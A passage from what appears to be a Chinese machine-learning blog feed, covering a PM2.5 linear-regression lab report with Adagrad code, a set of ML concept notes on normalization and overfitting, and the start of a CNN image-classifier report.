<h4 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h4><h5 id="1-优化验证集分布"><a href="#1-优化验证集分布" class="headerlink" title="1.优化验证集分布"></a>1.优化验证集分布</h5><p>​    在上一个module中，我们选择3600个数据的前3000个数据作为训练数据，选择后600个数据作为验证集，但是这样会让验证集过于集中，从而有失一般性。一个更好的方案是将验证集均匀的进行选取，这里我们每10个数据选择一个验证数据添加进数据集，让验证数据在一年之中均匀的进行分布。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t_x= []</span><br><span class="line">v_x = []</span><br><span class="line">t_y = []</span><br><span class="line">v_y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3600</span>):</span><br><span class="line">    temp = []</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        temp = np.append(X[i,<span class="number">5</span>,:],X[i,<span class="number">8</span>:<span class="number">10</span>,:])</span><br><span class="line">        v_x.append(temp)</span><br><span class="line">        v_y.append(y[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp = np.append(X[i,<span class="number">5</span>,:],X[i,<span class="number">8</span>:<span class="number">10</span>,:])</span><br><span class="line">        t_x.append(temp)</span><br><span class="line">        t_y.append(y[i])</span><br><span class="line">t_x = np.array(t_x)</span><br><span class="line">t_y = np.array(t_y)</span><br><span class="line">v_x = np.array(v_x)</span><br><span class="line">v_y = np.array(v_y)</span><br><span class="line"><span class="built_in">print</span>(t_x.shape)</span><br><span class="line"><span class="built_in">print</span>(t_y.shape)</span><br><span class="line"><span class="built_in">print</span>(v_x.shape)</span><br><span class="line"><span class="built_in">print</span>(v_y.shape)</span><br><span class="line"><span class="comment">#我们间隔抽取一些validation set,每隔10个数均匀选取</span></span><br><span class="line"><span class="comment">#然后剩下的加入train set</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(3240, 27)</span></span><br><span class="line"><span class="string">(3240,)</span></span><br><span class="line"><span class="string">(360, 27)</span></span><br><span class="line"><span class="string">(360,)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="2-Adagradient"><a href="#2-Adagradient" class="headerlink" title="2.Adagradient"></a>2.Adagradient</h5><p>​    经过验证，在3个feature的情况下，依然是采用Adagradient的方式在相同iteration的情况下收敛的更快。因此训练module2我们继续使用Adagradient。</p>
<h5 id="3-矩阵运算加速-important"><a href="#3-矩阵运算加速-important" class="headerlink" title="3.矩阵运算加速(important)"></a>3.矩阵运算加速(important)</h5><p>​    在module1中一个很大的问题是梯度下降过程太慢，每一个paremeter的偏导都需要单独的进行运算，module2我们采用矩阵运算对梯度下降算法进行加速处理，将梯度下降过程统一到矩阵运算中。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017161744832.png" alt="image-20221017161744832" style="zoom: 50%;" /></p>
<p>​    我们按西瓜书上的描述进行优化运算，将w和b吸收入向量形式w，然后将m个训练数据样本处理成矩阵的形式，将偏导运算转化成矩阵的运算。</p>
<h4 id="梯度下降求解-1"><a href="#梯度下降求解-1" class="headerlink" title="梯度下降求解"></a>梯度下降求解</h4><p>​    我们按照上面的加速优化方式实现Adagradient的梯度下降算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Adagrad</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Adagradient</span>(<span class="params">t_x,t_y,v_x,v_y,w</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="comment">#损失函数</span></span><br><span class="line">    lr_w = np.zeros(<span class="number">3</span>*<span class="number">9</span>+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        <span class="comment">#求出偏差的数组</span></span><br><span class="line">        loss_v = np.dot(t_x,w)-t_y</span><br><span class="line">        <span class="comment">#np.dot如果是同一维就是内积运算，不同维度是矩阵运算</span></span><br><span class="line">        <span class="comment">#print(loss_v.shape[0])</span></span><br><span class="line">        <span class="comment">#求出偏导的数组</span></span><br><span class="line">        grad_w  = (<span class="number">2</span>*np.dot(t_x.T,loss_v))/t_x.shape[<span class="number">0</span>]</span><br><span class="line">        lr_w += grad_w**<span class="number">2</span></span><br><span class="line">        sqrt_v = np.sqrt(lr_w)</span><br><span class="line">        <span class="comment">#使用sqrt方法计算</span></span><br><span class="line">        w = w-lr*(grad_w/sqrt_v)</span><br><span class="line">        loss_list.append(loss2(v_x,v_y,w))</span><br><span class="line">    <span class="keyword">return</span> w,loss_list</span><br></pre></td></tr></table></figure>
<p>​    我们选取learning rate = 2,iteration=20000的情况下，训练可以在3min之内完成，但是最终验证集的Loss = 49，并没有达到预期的效果。我猜想是这次样本点的选择更加的均匀但是模型的复杂度不足以支撑导致的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017163245588.png" alt="image-20221017163245588"></p>
<h3 id="3-Module3"><a href="#3-Module3" class="headerlink" title="3.Module3"></a>3.Module3</h3><p>​    在module2上进行模型训练并没有很好的达到预期效果，但是在训练时间的优化上大幅度提升。训练时间上的大幅度提升能够让我们选择更多的feature训练更加复杂的module。这次在模型3上我选择了全部18种参数进行训练。</p>
<h4 id="优化-2"><a href="#优化-2" class="headerlink" title="优化"></a>优化</h4><h5 id="1-cross-vaildation数据集更加合理"><a href="#1-cross-vaildation数据集更加合理" class="headerlink" title="1.cross-vaildation数据集更加合理"></a>1.cross-vaildation数据集更加合理</h5><p>​    这次我考虑到PM2.5在时间变化上的连续性，不再采用天作为数据集的分割单位，而是采用月份作为数据集的分割单位，一年一共12个月，每个月20*24=480个小时，前面471个小时都可以作为一个数据样本的起始点。</p>
<p>1.首先按照18个feature进行分割，将各个小时的数据添加到相应feature的后面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_train = data.iloc[:,<span class="number">3</span>:]</span><br><span class="line">data_train = data_train.replace([<span class="string">&#x27;NR&#x27;</span>],[-<span class="number">1</span>])</span><br><span class="line">data2 = np.array(data_train).astype(<span class="built_in">float</span>)</span><br><span class="line">feature_arr = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4320</span>,<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        feature_arr[j].extend(data2[i+j])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(feature_arr[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#5760</span></span><br><span class="line"><span class="comment">#(18, 5760)</span></span><br></pre></td></tr></table></figure>
<p>2.然后在每个feature对应位置中取数据，放入到12*471=5652个数据集中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">471</span>):</span><br><span class="line">        <span class="comment">#12个月每月471天</span></span><br><span class="line">        temp = []</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">            <span class="comment">#每个数据18个paremeter</span></span><br><span class="line">            <span class="keyword">if</span> row == <span class="number">9</span>:</span><br><span class="line">                y_data2.append(feature_arr[row][i*<span class="number">480</span>+j+<span class="number">9</span>])</span><br><span class="line">                <span class="comment">#i月 j小时</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                temp.append(feature_arr[row][i*<span class="number">480</span>+j+k])</span><br><span class="line">        train_data2.append(temp)</span><br></pre></td></tr></table></figure>
<p>3.添加b的系数1，每12小时取一个数据作为验证集。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(train_data.shape[<span class="number">0</span>]):</span><br><span class="line">    temp = []</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">12</span> == <span class="number">0</span>:</span><br><span class="line">        temp = np.append(train_data2[i],<span class="number">1</span>)</span><br><span class="line">        v_x.append(temp)</span><br><span class="line">        v_y.append(y_data2[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp = np.append(train_data2[i],<span class="number">1</span>)</span><br><span class="line">        t_x.append(temp)</span><br><span class="line">        t_y.append(y_data2[i])</span><br></pre></td></tr></table></figure>
<h5 id="2-数据归一化处理"><a href="#2-数据归一化处理" class="headerlink" title="2.数据归一化处理"></a>2.数据归一化处理</h5><p>​    为了防止梯度下降过程中出现波动，能够让梯度下降更加迅速，我们将样本集作归一化处理，用每一个feature的值减去feature的均值，然后除以feature的标准差，这样能够让每一个feature区间大致相同，不会出现梯度相差过大的情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#归一化</span></span><br><span class="line">feature2 = np.array(feature_arr)</span><br><span class="line">means = np.mean(feature2,axis = <span class="number">1</span>)</span><br><span class="line">std = np.std(feature2,axis=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5760</span>):</span><br><span class="line">        feature2[i][j] = (feature2[i][j]-means[i])/std[i]</span><br></pre></td></tr></table></figure>
<h5 id="3-随机梯度下降（stochastic-gradient-descent，SGD）"><a href="#3-随机梯度下降（stochastic-gradient-descent，SGD）" class="headerlink" title="3.随机梯度下降（stochastic gradient descent，SGD）"></a>3.随机梯度下降（stochastic gradient descent，SGD）</h5><p>​    在每次更新时用1个样本，随机也就是说我们用样本中的一个例子来近似我所有的样本，来调整<em>θ</em>，但是随机梯度下降可能会带来一定的问题，计算得到的并不是准确的一个梯度。但对于最优化问题，凸问题，虽然不是每次迭代得到的损失函数都向着全局最优方向， 但是大的整体的方向是向全局最优解的，最终的结果往往是在全局最优解附近。但是相比于批量梯度，这样的方法更快，更快收敛，虽然不是全局最优，但很多时候是我们可以接受的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Stochastic_iter</span>(<span class="params">t_x,t_y,v_x,v_y,w</span>):</span><br><span class="line">    loss_list2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        temp=np.random.randint(<span class="number">0</span>,t_x.shape[<span class="number">0</span>])</span><br><span class="line">        loss_vector = np.dot(t_x,w)-t_y</span><br><span class="line">        grad = (t_x[temp]*loss_vector[temp])/t_x.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#print(grad)</span></span><br><span class="line">        w=w-lr*grad</span><br><span class="line">        loss_list2.append(loss(v_x,v_y,w))</span><br><span class="line">    <span class="keyword">return</span> w,loss_list2</span><br></pre></td></tr></table></figure>
<p>​    但是在我们数据样本集的测试中，随机梯度下降不如dagrad的收敛效果，因此我们在最终模型中并未选择随机梯度下降。</p>
<h5 id="4-优化学习率"><a href="#4-优化学习率" class="headerlink" title="4.优化学习率"></a>4.优化学习率</h5><p>​    我测试了5个adagradient的学习率，比较他们的收敛效果，选择一个最优化的learning rate。可以看到在Adagradient情况下首先排除lr=0.01的曲线，然后我们放大局部做进一步的排除。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017191534099.png" alt="image-20221017191534099"></p>
<p>​    可以看到lr=0.5的时候收敛率还是相对慢了一些</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017192006029.png" alt="image-20221017192006029"></p>
<p>​    继续放大局部，可以看到在lr=2的时候收敛速度最快，但是在迭代次数很大的情况下，最终训练效果和lr=5,lr=10应该差别不大。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017192255304.png" alt="image-20221017192255304"></p>
<h4 id="梯度下降求解-2"><a href="#梯度下降求解-2" class="headerlink" title="梯度下降求解"></a>梯度下降求解</h4><p>​    我们依然是采用Adagradient作为梯度下降算法进行梯度下降。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Adagradient</span>(<span class="params">t_x,t_y,v_x,v_y,w,lr</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="comment">#损失函数</span></span><br><span class="line">    lr_w = np.zeros(<span class="number">18</span>*<span class="number">9</span>+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        <span class="comment">#求出偏差的数组</span></span><br><span class="line">        loss_v = np.dot(t_x,w)-t_y</span><br><span class="line">        <span class="comment">#print(loss_v.shape[0])</span></span><br><span class="line">        <span class="comment">#求出偏导的数组</span></span><br><span class="line">        grad_w  = (<span class="number">2</span>*np.dot(t_x.T,loss_v))/t_x.shape[<span class="number">0</span>]</span><br><span class="line">        lr_w += grad_w**<span class="number">2</span></span><br><span class="line">        sqrt_v = np.sqrt(lr_w)</span><br><span class="line">        w = w-lr*(grad_w/sqrt_v)</span><br><span class="line">        loss_list.append(loss(v_x,v_y,w))</span><br><span class="line">    <span class="keyword">return</span> w,loss_list</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221018220059705.png" alt="image-20221018220059705" style="zoom: 67%;" /></p>
<h3 id="4-模型优化方向"><a href="#4-模型优化方向" class="headerlink" title="4.模型优化方向"></a>4.模型优化方向</h3><p>​    由于每个月只取了前20天的数据，因此想要按全年连续分割并不成立。可以对预测时间段进行季节分类，每个季度建立不同的训练模型，虽然季节的部分信息已经涵盖在气象观测指数当中，但可能还存在忽略因素，因此按季节划分是理论上可行的。另一个优化方向是增加高次项，提升模型复杂程度，但要防止过拟合现象的产生。</p>
<p>​    我增加了x的平方项，增加维度进行测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_data = np.empty([<span class="number">12</span>*<span class="number">471</span>,<span class="number">18</span>*<span class="number">9</span>*<span class="number">2</span>],dtype=<span class="built_in">float</span>)</span><br><span class="line">y_data = np.empty(<span class="number">12</span>*<span class="number">471</span>)</span><br><span class="line"><span class="comment">#轴1是18个feature,轴2是240天24h</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">471</span>):</span><br><span class="line">    <span class="comment">#数据的一共总组数</span></span><br><span class="line">        y_data[i*<span class="number">471</span>+j] = feature_arr[<span class="number">9</span>][i*<span class="number">480</span>+j+<span class="number">9</span>]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">            train_data[i*<span class="number">471</span>+j][k*<span class="number">9</span>:<span class="number">9</span>*k+<span class="number">9</span>] = feature_arr[k][i*<span class="number">480</span>+j:i*<span class="number">480</span>+j+<span class="number">9</span>]</span><br><span class="line">        train_data[i*<span class="number">471</span>+j][<span class="number">18</span>*<span class="number">9</span>:<span class="number">18</span>*<span class="number">9</span>*<span class="number">2</span>] = np.power(train_data[i*<span class="number">471</span>+j][:<span class="number">18</span>*<span class="number">9</span>],<span class="number">2</span>)</span><br><span class="line">      <span class="comment">#加入平方项</span></span><br><span class="line"><span class="built_in">print</span>(train_data.shape)</span><br><span class="line"><span class="built_in">print</span>(train_data[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(y_data[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(y_data.shape)</span><br></pre></td></tr></table></figure>
<p>​    测试loss的值还是比较高，且收敛的速度比较慢。</p>
<h2 id="结果分析和评估"><a href="#结果分析和评估" class="headerlink" title="结果分析和评估"></a>结果分析和评估</h2><p>​    下面的过程使用训练模型对text进行预测。这里我们选择loss较小的module3进行模型训练，在模型训练时，我们将考虑train-set中的所有数据，利用所有数据生成训练模型。</p>
<p>​    在没有loss计算的情况下，模型的训练速度很快，我适当提高了迭代的轮数，最终训练时间和参数如下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017195156047.png" alt="image-20221017195156047"></p>
<p>​    下面对data进行预测，我编写了一个预测函数，并将预测结果输入到.csv文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">da_t = da.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(da_t)</span><br><span class="line">da_t = da_t.replace([<span class="string">&#x27;NR&#x27;</span>],[-<span class="number">1</span>])</span><br><span class="line">da2 = np.array(da_t).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(da2.shape)</span><br><span class="line">predict_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">240</span>):</span><br><span class="line">    temp = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        temp.extend(da2[i*<span class="number">18</span>+j])</span><br><span class="line">    temp.extend([<span class="number">1</span>])</span><br><span class="line">    predict_data.append(temp)</span><br><span class="line">p_d = np.array(predict_data)</span><br><span class="line">data_pre = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>:[],</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:[]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">w,p_d,data_pre</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">240</span>):</span><br><span class="line">        data_pre[<span class="string">&#x27;id&#x27;</span>].append(<span class="string">&#x27;id_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        data_pre[<span class="string">&#x27;value&#x27;</span>].append(w.dot(p_d[i]))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">240</span>):</span><br><span class="line">        <span class="keyword">if</span> data_pre[<span class="string">&#x27;value&#x27;</span>][j]&lt;<span class="number">0</span>:</span><br><span class="line">            data_pre[<span class="string">&#x27;value&#x27;</span>][j]=<span class="number">0</span></span><br><span class="line">    <span class="comment">#将小于0的数据转化为0</span></span><br><span class="line">    df = pd.DataFrame(data_pre)</span><br><span class="line">    df.to_csv(<span class="string">&#x27;predict.csv&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,index=<span class="literal">False</span>,header=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#w采用覆盖，a是追加</span></span><br><span class="line">    <span class="keyword">return</span> data_pre</span><br></pre></td></tr></table></figure>
<p>​    下面展示部分预测数据和预测数据的直观分布。</p>
<p><strong>module3</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017202419184.png" alt="image-20221017202419184"><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221017202939765.png" alt="image-20221017202939765"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>​    实验中我们采用了多种方式对模型进行了优化，通过对比选择了loss最低的方案进行了建模，并对结果进行了预测。通过这次实验，进一步提升了我对liner Regression方法的认识。并学会使用优化方法提升回归效率，优化feature分布，使回归能够达到更好的效果，在实验中提升知识应用和实作能力。</p>
]]></content>
      <categories>
        <category>Machine Learning</category>
      </categories>
      <tags>
        <tag>linear regression</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习问题整理</title>
    <url>/2023/01/18/MLQ/</url>
    <content><![CDATA[<h4 id="1-特征归一化"><a href="#1-特征归一化" class="headerlink" title="1.特征归一化"></a>1.特征归一化</h4><p>​    对数值类型的特征做归一化可以将所以的特征都统一到一个大致相同的数值区间内</p>
<p>(1)线性函数归一化(Min-Max Scaling),它对原始数据进行线性变换，使结果映射到[0,1]范围内，实现对数据的等比缩放</p>
<script type="math/tex; mode=display">
X_{norm}=\frac{X-X_{min}}{X_{max}-X_{min}}</script><p>其中X为原始数据，Xmax、Xmin分别为数据最大值和最小值。</p>
<p>（2）零均值归一化（Z-Score Normalization）。它会将原始数据映射到均值为 0、标准差为1的分布上。具体来说，假设原始特征的均值为μ、标准差为σ，那么 归一化公式定义为</p>
<script type="math/tex; mode=display">
Z=\frac{x-\mu}{\sigma}</script><p>​    为什么需要对数值型特征做归一化呢？我们不妨借助随机梯度下降的实例来 说明归一化的重要性。假设有两种数值型特征，x1的取值范围为 [0, 10]，x2的取值 范围为[0, 3]，于是可以构造一个目标函数符合图1.1（a）中的等值图。 在学习速率相同的情况下，x1的更新速度会大于x2，需要较多的迭代才能找到最优解。如果将x1和x2归一化到相同的数值区间后，优化目标的等值图会变成图 1.1(b）中的圆形，x1和x2的更新速度变得更为一致，容易更快地通过梯度下降找 到最优解。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118145939691.png" alt="image-20230118145939691"></p>
<h4 id="2-在图像分类任务中，训练数据不足会带来什么问题？如何缓解数据量不足带-来的问题？"><a href="#2-在图像分类任务中，训练数据不足会带来什么问题？如何缓解数据量不足带-来的问题？" class="headerlink" title="2.在图像分类任务中，训练数据不足会带来什么问题？如何缓解数据量不足带 来的问题？"></a>2.在图像分类任务中，训练数据不足会带来什么问题？如何缓解数据量不足带 来的问题？</h4><p>​    一个模型所能提供的信息一般来源于两个方面，一是训练数据中蕴含的信 息；二是在模型的形成过程中（包括构造、学习、推理等），人们提供的先验信 息。当训练数据不足时，说明模型从原始数据中获取的信息比较少，这种情况下 要想保证模型的效果，就需要更多先验信息。先验信息可以作用在模型上，例如 让模型采用特定的内在结构、条件假设或添加其他一些约束条件；先验信息也可 以直接施加在数据集上，即根据特定的先验假设去调整、变换或扩展训练数据， 让其展现出更多的、更有用的信息，以利于后续模型的训练和学习。</p>
<p>​    具体到图像分类任务上，训练数据不足带来的问题主要表现在过拟合方面， 即模型在训练样本上的效果可能不错，但在测试集上的泛化效果不佳。根据上述 讨论，对应的处理方法大致也可以分两类，一是基于模型的方法，主要是采用降低过拟合风险的措施，包括简化模型（如将非线性模型简化为线性模型）、添 约束项以缩小假设空间（如L1/L2正则项）、集成学习、Dropout超参数等；二是基于数据的方法，主要通过数据扩充（Data Augmentation），即根据一些先验知 识，在保持特定信息的前提下，对原始数据进行适当变换以达到扩充数据集的效果。具体到图像分类任务中，在保持图像类别不变的前提下，可以对训练集中的 每幅图像进行以下变换。</p>
<p>   (1）一定程度内的随机旋转、平移、缩放、裁剪、填充、左右翻转等，这些 变换对应着同一个目标在不同角度的观察结果。</p>
<p>（2）对图像中的像素添加噪声扰动，比如椒盐噪声、高斯白噪声等。 </p>
<p>（3）颜色变换。例如，在图像的RGB颜色空间上进行主成分分析，得到3个 主成分的特征向量p1 ,p2 ,p3及其对应的特征值 λ1 ,λ2 ,λ3，然后在每个像素的RGB值上 添加增量[p1 ,p2 ,p3 ]•[α1λ1 ,α2λ2 ,α3λ3 ] T，其中 α1 ,α2 ,α3是均值为0、方差较小的高斯分布随 机数。</p>
<p> （4）改变图像的亮度、清晰度、对比度、锐度等。</p>
<h4 id="3-准确率的缺陷"><a href="#3-准确率的缺陷" class="headerlink" title="3.准确率的缺陷"></a>3.准确率的缺陷</h4><p>准确率是分类问题中最简单也是最直观的评价指标，但存在明显的缺陷。比 如，当负样本占99%时，分类器把所有样本都预测为负样本也可以获得99%的准确 率。所以，当不同类别的样本比例非常不均衡时，占比大的类别往往成为影响准确率的最主要因素。可以使用更为有效的平均准确率（每个类别下的样本准确率的算术平 均）作为模型评估的指标</p>
<h4 id="4-过拟合，欠拟合"><a href="#4-过拟合，欠拟合" class="headerlink" title="4.过拟合，欠拟合"></a>4.过拟合，欠拟合</h4><p>​    过拟合是指模型对于训练数据拟合呈过当的情况，反映到评估指标上，就是模型在训练集上的表现很好，但在测试集和新数据上的表现较差。欠拟合指的是 模型在训练和预测时表现都不好的情况。图2.5形象地描述了过拟合和欠拟合的区 别。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118162938746.png" alt="image-20230118162938746"></p>
<p>​    可以看出，图2.5（a）是欠拟合的情况，拟合的黄线没有很好地捕捉到数据的 特征，不能够很好地拟合数据。图2.5（c）则是过拟合的情况，模型过于复杂，把 噪声数据的特征也学习到模型中，导致模型泛化能力下降，在后期应用过程中很 容易输出错误的预测结果。</p>
<ul>
<li><font color='blue'>降低“过拟合”风险的方法</font>

</li>
</ul>
<p>（1）从数据入手，获得更多的训练数据。使用更多的训练数据是解决过拟合 问题最有效的手段，因为更多的样本能够让模型学习到更多更有效的特征，减小 噪声的影响。当然，直接增加实验数据一般是很困难的，但是可以通过一定的规 则来扩充训练数据。比如，在图像分类的问题上，可以通过图像的平移、旋转、 缩放等方式扩充数据；更进一步地，可以使用生成式对抗网络来合成大量的新训 练数据。</p>
<p>（2）降低模型复杂度。在数据较少时，模型过于复杂是产生过拟合的主要因素，适当降低模型复杂度可以避免模型拟合过多的采样噪声。例如，在神经网络模型中减少网络层数、神经元个数等；在决策树模型中降低树的深度、进行剪枝 等。</p>
<p>（3）正则化方法。给模型的参数加上一定的正则约束，比如将权值的大小加<br>入到损失函数中。以L2正则化为例：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230118163120420.png" alt="image-20230118163120420"></p>
<p>这里解释一下正则化系数，<strong>L1会趋向于产生少量的特征，而其他的特征都是0，而L2会选择更多的特征，这些特征都会接近于0</strong>，因为L1正则化会尽量将曲线在角的位置相交，因为在中间相交是可能性不大的，这样就会让参数稀疏</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/v2-192a2e85bc82fae3e26f5e8441b2e6ea_720w.jpg" alt="img"></p>
<p>（4）集成学习方法。集成学习是把多个模型集成在一起，来降低单一模型的 过拟合风险，如Bagging方法，这其实在深度学习中的dropout中就反应了这一点，通过一定概率的连接，改变模型，实际计算了多个模型的综合。</p>
<ul>
<li><font color='blue'>降低“欠拟合”风险</font>

</li>
</ul>
<p>（1）添加新特征。当特征不足或者现有特征与样本标签的相关性不强时，模型容易出现欠拟合。通过挖掘“上下文特征”“ID类特征”“组合特征”等新的特征，往 往能够取得更好的效果。在深度学习潮流中，有很多模型可以帮助完成特征工 程，如因子分解机、梯度提升决策树、Deep-crossing等都可以成为丰富特征的方法。</p>
<p>（2）增加模型复杂度。简单模型的学习能力较差，通过增加模型的复杂度可 以使模型拥有更强的拟合能力。例如，在线性模型中添加高次项，在神经网络模型中增加网络层数或神经元个数等。</p>
<p>（3）减小正则化系数。正则化是用来防止过拟合的，但当模型出现欠拟合现 象时，则需要有针对性地减小正则化系数。</p>
<h4 id="5-逻辑回归和线性回归的区别"><a href="#5-逻辑回归和线性回归的区别" class="headerlink" title="5.逻辑回归和线性回归的区别"></a>5.逻辑回归和线性回归的区别</h4><p>​    逻辑回归，乍一听名字似乎和数学中的线性回归问题异派同源，但其本质却 是大相径庭。</p>
<p>​    首先，逻辑回归处理的是分类问题，线性回归处理的是回归问题，这是两者最本质的区别。逻辑回归中，因变量取值是一个二元分布，模型学习得出的是$E[y|x;\theta]$,即给定自变量和超参数后，得到的因变量的期望，并基于此期望来处理预测分类问题。而线性回归求解的是$y’=\theta^Tx$,是对我们假设的真实关系$y=\theta^Tx+\epsilon$的一个近似，其中$\epsilon$代表误差项，我们使用这个近似项来求解回归问题。</p>
]]></content>
      <categories>
        <category>Mechine Learning</category>
      </categories>
      <tags>
        <tag>Mechine Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习ML2</title>
    <url>/2022/12/08/ML3/</url>
    <content><![CDATA[<h1 id="CNN神经网络分类器"><a href="#CNN神经网络分类器" class="headerlink" title="CNN神经网络分类器"></a><centering>CNN神经网络分类器</centering></h1><h3 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h3><p>​    实验的主要目的是使用CNN架构实现一个神经网络图像分类器，能够将网络上收集到的食物图片分为11类，并对模型架构、训练参数量和准确率进行评估。通过尝试对CNN深度进行改变来比较模型训练的效果，并尝试用data normalization和data augmentation来优化模型。</p>
<h3 id="2-实验环境"><a href="#2-实验环境" class="headerlink" title="2.实验环境"></a>2.实验环境</h3><p>kaggle；python 3.9</p>
<h3 id="3-实验方法"><a href="#3-实验方法" class="headerlink" title="3.实验方法"></a>3.实验方法</h3><h4 id="3-1-预处理"><a href="#3-1-预处理" class="headerlink" title="3.1 预处理"></a>3.1 预处理</h4><h5 id="3-1-1-文件读取"><a href="#3-1-1-文件读取" class="headerlink" title="3.1.1 文件读取"></a>3.1.1 文件读取</h5><p>​    首先对训练文件进行读取，在读取文件时，我们将每一个照片读取成128*128像素，3RGB的图片，这里对文件读取时采用cv2模块，另外对训练集、验证集和测试集要加以区分，因为训练集和验证集的数据有图像对应分类真实label。</p>
